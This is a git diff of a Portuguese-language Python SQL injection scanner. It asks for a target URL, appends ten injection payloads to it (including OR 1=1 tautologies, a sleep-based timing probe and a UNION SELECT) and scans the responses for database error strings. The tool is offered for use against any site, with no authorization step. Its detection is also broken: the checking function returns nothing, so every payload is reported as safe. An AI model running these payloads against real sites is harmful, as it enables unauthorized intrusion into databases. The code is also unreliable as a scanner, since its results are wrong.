@@ -37,27 +37,51 @@ print (logo)
 
 import requests
 
-def testa_injecao_sql(url):
-    # Lista de payloads para testar
-    payloads = ["'", "' OR 1=1 --", "' UNION SELECT * FROM information_schema.tables --"]
 
-    for payload in payloads:
-        try:
-            # Envia requisição GET com o payload
-            resposta = requests.get(url + "?" + payload, timeout=5)
 
-            # Verifica se o payload teve efeito
-            if "error" in resposta.text.lower() or resposta.status_code == 500:
-                print(f"Possivel SQL injection vulnerabilidade encontrada: {url} + {payload}")
-                return True
-        except requests.exceptions.RequestException as e:
-            print(f"Erro ao testar {url}: {e}")
-            return False
+def verificar_erros_sql(resposta):
+  erros_sql = ["sql syntax", "mysql_fetch", "syntax error", "unclosed quotation", "query failed"]
 
-    print(f"Não encontrada vulnerabilidade SQL em {url}")
-    return False
 
+  if any(erro in resposta.text.lower() for erro in erros_sql):
+    # possível vulnerabilidade
+    print("possivel vulnerabilidades encontradas")
+    print("erros encontrados", [erro for erro in erros_sql if erro in resposta.text.lower()])
+
+  else:
+
+    print("sem vulnerabilidade")
 url = input("Digite a URL com protocolo http ou https do site para testar: ")
-testa_injecao_sql(url)
+resposta = requests.get(url)
+verificar_erros_sql(resposta)
 
+payloads = [
+    "'",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "';--",
+    "' OR 'a'='a",
+    "\" OR \"1\"=\"1",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "' OR sleep(5)--",
+    "' AND 1=0 UNION SELECT NULL--"
+]
 
+# Entrada da URL base
+url_base = input("Digite a URL (ex: https://sqltest.net/lesson1.php?id=): ")
+
+print("\n🔍 Iniciando testes de SQL Injection...\n")
+
+for payload in payloads:
+    url_teste = url_base + payload
+    print(f"Testando: {url_teste}")
+    try:
+        resposta = requests.get(url_teste, timeout=10)
+        vulneravel = verificar_erros_sql(resposta)
+        if vulneravel:
+            print(f"⚠️ Vulnerabilidade detectada com payload: {payload}\n")
+        else:
+            print("Nenhuma vulnerabilidade com esse payload.\n")
+    except requests.exceptions.RequestException as e:
+        print(f"Erro ao acessar a URL: {e}\n")
